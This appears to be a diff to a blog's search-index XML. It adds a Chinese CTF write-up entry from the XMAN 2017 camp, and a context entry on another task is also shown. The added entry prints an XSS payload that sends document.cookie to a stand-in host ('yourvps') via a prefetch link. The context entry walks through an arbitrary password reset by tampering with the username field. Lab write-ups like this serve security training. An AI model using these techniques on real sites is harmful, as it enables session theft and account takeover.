@@ -17,6 +17,13 @@
 
     
     <entry>
+      <title><![CDATA[XMAN夏令营-2017-XSS-writeup]]></title>
+      <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-XSS-writeup%2F</url>
+      <content type="text"><![CDATA[xss Task11http://202.112.51.217:33323/ Solution查看csp头：1&quot;default-src &apos;self&apos;; script-src &apos;self&apos; &apos;unsafe-inline&apos;;&quot; 这里给出一个payload：1234567&lt;script&gt; var head = document.getElementsByTagName(&quot;head&quot;)[0] var n0t = document.createElement(&quot;link&quot;); n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;); n0t.setAttribute(&quot;href&quot;, &quot;http://yourvps/?&quot; + document.cookie); head.appendChild(n0t);&lt;/script&gt; Task21http://202.112.51.217:43424 Solution没有csp头。但没办法直接得到cookie。 另外有一个flag.php，访问后如下：1only admin can see the flag! 有点像0ctf2017的题目.]]></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[XMAN夏令营-2017-比赛系统-writeup]]></title>
       <url>%2F2017%2F08%2F22%2FXMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-%E6%AF%94%E8%B5%9B%E7%B3%BB%E7%BB%9F-writeup%2F</url>
       <content type="text"><![CDATA[逻辑问题、任意用户密码重置 Task1http://202.112.51.217:8013 Solution有登陆和注册的功能，其中登陆处还有忘记密码。结合url：12http://202.112.51.217:8013/logic2_regist.phphttp://202.112.51.217:8013/logic2_login.php 猜测应该是逻辑问题。 我们注册一个账号 对我这个账号而言，其密保问题和答案均为chybeta 接下来看看登陆功能，用刚刚注册的账号登陆，得到提示：1普通用户登录成功,没什么用 那估计要登陆超级用户咯，比如admin。接下来用到忘记密码功能。 我们先输入用户名chybeta， 输入密保答案chybeta 抓包！ 可以看到有个username字段。我们猜测后端忘记密码的流程是这样的，先从数据库中抽取与用户名相对应的密保问题与答案，之后只要判断我们输入的答案是否和密保答案是否一致即可修改密码，而没有再一次的检查用户名。所以可能存在任意用户密码重置漏洞。 修改username为admin，然后forward掉。然后就可以重置admin的密码了。 重置后登陆得到；1FLAG&#123;You_Kookokoko_logic_OK&#125;]]></content>
